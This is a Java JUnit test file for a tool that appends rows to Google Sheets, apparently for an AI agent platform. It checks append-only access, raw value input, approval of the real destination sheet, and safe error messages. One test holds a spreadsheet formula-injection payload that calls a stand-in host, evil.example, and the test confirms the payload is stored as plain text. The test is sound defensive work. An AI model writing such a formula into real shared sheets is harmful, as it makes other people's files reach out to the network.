package com.relay.infrastructure.tools;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.relay.application.json.Json;
import com.relay.application.json.SchemaValidator;
import com.relay.domain.Connection;
import com.relay.infrastructure.google.GoogleOAuth;
import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The rules that make one appended row an acceptable write into a shared file.
 *
 * <p>A spreadsheet is not a mailbox and not a channel: several people are editing it, its
 * cells are read as facts long after anybody remembers where they came from, and a
 * spreadsheet has no version of "delete this message". So four things have to hold, and each
 * of them is here because the alternative is somebody else's data:
 *
 * <ul>
 *   <li><b>It only appends.</b> The scope Relay asks for, {@code spreadsheets}, can rewrite
 *       every cell of every sheet the account can open — Google publishes no append-only and
 *       no single-file alternative. The one URL this tool may reach is a {@code :append} with
 *       {@code INSERT_ROWS}, and an edit that adds {@code values.update} or {@code
 *       values.get} has to break a test to get there.</li>
 *   <li><b>A cell is text.</b> {@code USER_ENTERED} would parse a model-written cell the way
 *       the browser does, so a value beginning with {@code =} becomes a live formula in
 *       somebody's shared file.</li>
 *   <li><b>The approval screen names the real sheet.</b> A gate that says "onaylıyor musun"
 *       over a blank destination is not a gate.</li>
 *   <li><b>A missing permission is a sentence, not a stack trace.</b> Widening the grant
 *       leaves every existing connection one scope short until its owner reconnects.</li>
 * </ul>
 */
class SheetsAppendRowTest {

    private static final FixtureStore FIXTURES = new FixtureStore();
    private static final String SHEET_ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-x";
    private static final String READ_ONLY = "https://www.googleapis.com/auth/gmail.readonly "
            + "https://www.googleapis.com/auth/calendar.readonly openid email";

    // ---- what leaves the machine ------------------------------------------

    @Test
    void the_only_thing_this_tool_can_do_to_a_sheet_is_add_a_row_to_the_end() throws Exception {
        Recording tool = new Recording();

        tool.call(row("2026-08-01", "3 blocker", "KAN-11"), google(GoogleOAuth.SCOPES));

        assertThat(tool.url).contains(":append");
        assertThat(tool.url).contains("insertDataOption=INSERT_ROWS");
        // Reading a cell back would put a stranger's spreadsheet on the run timeline; writing
        // one over would lose a row nobody can recover.
        assertThat(tool.url).doesNotContain(":update").doesNotContain(":clear")
                .doesNotContain(":batchUpdate");
        assertThat(tool.calls).isEqualTo(1);
    }

    /**
     * The one that would be a real incident. A blocker scan writes what the model wrote, and
     * "=IMPORTXML(…)" is a perfectly ordinary-looking string until Sheets evaluates it —
     * inside a file several people trust, reaching the network from a cell.
     */
    @Test
    void a_cell_that_looks_like_a_formula_is_stored_as_text_not_evaluated() throws Exception {
        Recording tool = new Recording();

        tool.call(row("=IMPORTXML(\"https://evil.example\",\"//a\")", "normal"),
                google(GoogleOAuth.SCOPES));

        assertThat(tool.url).contains("valueInputOption=RAW");
        assertThat(tool.url).doesNotContain("USER_ENTERED");
        assertThat(tool.body.path("values").get(0).get(0).asText())
                .isEqualTo("=IMPORTXML(\"https://evil.example\",\"//a\")");
    }

    @Test
    void the_row_that_was_approved_is_the_row_that_is_written() throws Exception {
        Recording tool = new Recording();

        JsonNode result = tool.call(row("2026-08-01", "3 blocker", "KAN-11"),
                google(GoogleOAuth.SCOPES));

        assertThat(tool.body.path("values")).hasSize(1);
        assertThat(tool.body.path("values").get(0)).hasSize(3);
        assertThat(result.path("values")).hasSize(3);
        assertThat(result.path("spreadsheetId").asText()).isEqualTo(SHEET_ID);
        assertThat(result.path("overwritten").asBoolean(true)).isFalse();
        assertThat(result.path("url").asText()).contains(SHEET_ID);
    }

    // ---- the destination the human is asked to approve --------------------

    /**
     * The Slack case, one field over: a run posted to {@code {{steps[3].channel}}} while
     * {@code #all-samed} sat configured and unused. Resolving in {@code withDefaults} rather
     * than at call time is what puts the real sheet on the approval screen.
     */
    @Test
    void the_configured_sheet_is_resolved_before_anybody_is_asked_to_approve_it() {
        SheetsTool.AppendRow tool = new SheetsTool.AppendRow("replay", FIXTURES, null);
        Connection connection = google(GoogleOAuth.SCOPES,
                Map.of("defaultSpreadsheetId", SHEET_ID, "defaultSheetName", "Takip"));

        ObjectNode missing = Json.object();
        missing.putArray("values").add("2026-08-01");
        JsonNode resolved = tool.withDefaults(missing, connection);
        assertThat(resolved.path("spreadsheetId").asText()).isEqualTo(SHEET_ID);
        assertThat(resolved.path("sheetName").asText()).isEqualTo("Takip");

        // A placeholder is not a destination either — no substitution is ever going to fill it.
        ObjectNode deferred = Json.object();
        deferred.put("spreadsheetId", "{{steps[1].spreadsheetId}}");
        deferred.putArray("values").add("2026-08-01");
        assertThat(tool.withDefaults(deferred, connection).path("spreadsheetId").asText())
                .isEqualTo(SHEET_ID);
    }

    /** Nothing configured, nothing invented — except the tab name every sheet starts with. */
    @Test
    void without_a_configured_sheet_nothing_is_made_up() {
        SheetsTool.AppendRow tool = new SheetsTool.AppendRow("replay", FIXTURES, null);

        ObjectNode missing = Json.object();
        missing.putArray("values").add("x");
        JsonNode resolved = tool.withDefaults(missing, google(GoogleOAuth.SCOPES));

        assertThat(resolved.path("spreadsheetId").asText()).isEmpty();
        assertThat(resolved.path("sheetName").asText()).isEqualTo("Sayfa1");
        // …and an id nobody could supply fails the gate rather than reaching Google.
        assertThat(SchemaValidator.validate(tool.schema(), resolved).valid()).isFalse();
    }

    /**
     * Asked for an id, a model hands over the address it read. Taking the id out of the URL
     * is reading what was given; refusing it would send the run round a loop it cannot win.
     */
    @Test
    void a_pasted_url_is_read_as_the_id_it_contains() {
        SheetsTool.AppendRow tool = new SheetsTool.AppendRow("replay", FIXTURES, null);

        ObjectNode params = Json.object();
        params.put("spreadsheetId", "https://docs.google.com/spreadsheets/d/" + SHEET_ID + "/edit#gid=0");
        params.putArray("values").add("x");

        assertThat(tool.withDefaults(params, null).path("spreadsheetId").asText()).isEqualTo(SHEET_ID);
        assertThat(SheetsTool.AppendRow.spreadsheetId(SHEET_ID)).isEqualTo(SHEET_ID);
    }

    // ---- what is refused --------------------------------------------------

    /**
     * An empty array satisfies {@code required} — it is neither null nor a blank string — so
     * before {@code minItems} the gate approved a write that wrote nothing and Google counted
     * it as a successful append.
     */
    @Test
    void a_row_with_no_cells_in_it_never_reaches_the_gate() {
        SheetsTool.AppendRow tool = new SheetsTool.AppendRow("replay", FIXTURES, null);

        ObjectNode empty = Json.object();
        empty.put("spreadsheetId", SHEET_ID);
        empty.putArray("values");

        assertThat(SchemaValidator.validate(tool.schema(), empty).valid()).isFalse();
        assertThat(tool.execute(empty, null).mode()).isEqualTo("rejected");
    }

    @Test
    void a_row_without_a_spreadsheet_is_refused() {
        SheetsTool.AppendRow tool = new SheetsTool.AppendRow("replay", FIXTURES, null);

        ObjectNode params = Json.object();
        params.putArray("values").add("2026-08-01");

        assertThat(SchemaValidator.validate(tool.schema(), params).valid()).isFalse();
    }

    // ---- the permission ---------------------------------------------------

    @Test
    void a_grant_without_the_sheets_permission_is_refused_before_anything_leaves() {
        Recording tool = new Recording();

        assertThatThrownBy(() -> tool.call(row("x"), google(READ_ONLY)))
                .isInstanceOf(HttpJson.ToolCallException.class)
                .hasMessageContaining("Bağlantılar")
                .hasMessageContaining("yeniden bağlan")
                .hasMessageContaining("e-tablo");

        assertThat(tool.calls).isZero();
    }

    /** The same problem reached the other way: a grant we could not read, revoked by hand. */
    @Test
    void googles_own_scope_rejection_is_told_in_the_same_words_and_quotes_nothing() {
        Recording tool = new Recording();
        tool.failure = HttpJson.failure(403, "sheets.googleapis.com",
                "{\"error\":{\"status\":\"PERMISSION_DENIED\",\"message\":\"Request had "
                        + "insufficient authentication scopes\",\"token\":\"ya29.leakedaccesstoken\"}}");

        assertThatThrownBy(() -> tool.call(row("x"), google("")))
                .isInstanceOf(HttpJson.ToolCallException.class)
                .hasMessageContaining("yeniden bağlan")
                .hasMessageNotContaining("PERMISSION_DENIED")
                .hasMessageNotContaining("ya29.");
    }

    /** A tab that is not there is a fixable mistake, and the message says how to fix it. */
    @Test
    void a_missing_tab_names_the_setting_that_is_wrong() {
        Recording tool = new Recording();
        tool.failure = HttpJson.failure(400, "sheets.googleapis.com",
                "{\"error\":{\"code\":400,\"message\":\"Unable to parse range: Sheet1\"}}");

        assertThatThrownBy(() -> tool.call(row("x"), google(GoogleOAuth.SCOPES)))
                .isInstanceOf(HttpJson.ToolCallException.class)
                .hasMessageContaining("Sayfa1");
    }

    /**
     * The connection that already exists must not break the day the scope widens: Google does
     * not revoke a token because the app started asking for more, and the brief has to keep
     * reading — and drafting — until its owner gets around to reconnecting.
     */
    @Test
    void a_grant_from_before_the_new_permission_still_reads_and_still_drafts() {
        Connection old = google(READ_ONLY);

        assertThat(GoogleOAuth.granted(old, GoogleOAuth.SPREADSHEETS_SCOPE)).isFalse();
        assertThat(GoogleOAuth.granted(old, "https://www.googleapis.com/auth/gmail.readonly")).isTrue();
        assertThat(GoogleOAuth.granted(old, "https://www.googleapis.com/auth/calendar.readonly")).isTrue();
        assertThat(GoogleOAuth.granted(google(GoogleOAuth.SCOPES), GoogleOAuth.SPREADSHEETS_SCOPE))
                .isTrue();
        // No recorded scope is unknown, not absent — those tokens predate the field.
        assertThat(GoogleOAuth.granted(google(""), GoogleOAuth.SPREADSHEETS_SCOPE)).isTrue();

        // The new permission is asked for, and every old one is still asked for with it.
        assertThat(GoogleOAuth.SCOPES).contains(GoogleOAuth.SPREADSHEETS_SCOPE)
                .contains(GoogleOAuth.CALENDAR_EVENTS_SCOPE)
                .contains(GoogleOAuth.COMPOSE_SCOPE)
                .contains("gmail.readonly")
                .contains("calendar.readonly");
        // Sheets is the whole grant Google offers; Drive is not asked for on top of it.
        assertThat(GoogleOAuth.SCOPES).doesNotContain("auth/drive");
    }

    // ---- plumbing ---------------------------------------------------------

    /** A sheets tool that answers itself and remembers exactly what it was asked to do. */
    private static class Recording extends SheetsTool.AppendRow {

        private String url;
        private JsonNode body;
        private int calls;
        private RuntimeException failure;

        Recording() {
            super("live", FIXTURES, null);
        }

        @Override
        protected Map<String, String> headers(Connection connection) {
            return Map.of("Authorization", "Bearer test-token");
        }

        @Override
        JsonNode post(String url, Map<String, String> headers, JsonNode body) {
            this.url = url;
            this.body = body;
            this.calls++;
            if (failure != null) {
                throw failure;
            }
            ObjectNode appended = Json.object();
            appended.put("spreadsheetId", SHEET_ID);
            appended.putObject("updates")
                    .put("updatedRange", "Sayfa1!A14:C14")
                    .put("updatedRows", 1)
                    .put("updatedCells", body.path("values").get(0).size());
            return appended;
        }
    }

    private static ObjectNode row(String... cells) {
        ObjectNode params = Json.object();
        params.put("spreadsheetId", SHEET_ID);
        params.put("sheetName", "Sayfa1");
        var values = params.putArray("values");
        for (String cell : cells) {
            values.add(cell);
        }
        return params;
    }

    private static Connection google(String scope) {
        return google(scope, Map.of());
    }

    private static Connection google(String scope, Map<String, String> extra) {
        Map<String, String> config = new LinkedHashMap<>();
        config.put("accessToken", "ya29.test-access-token");
        config.put("refreshToken", "1//test-refresh-token");
        config.put("scope", scope);
        config.putAll(extra);
        return Connection.of(GoogleOAuth.PROVIDER, config, Instant.parse("2026-08-01T09:00:00Z"));
    }
}
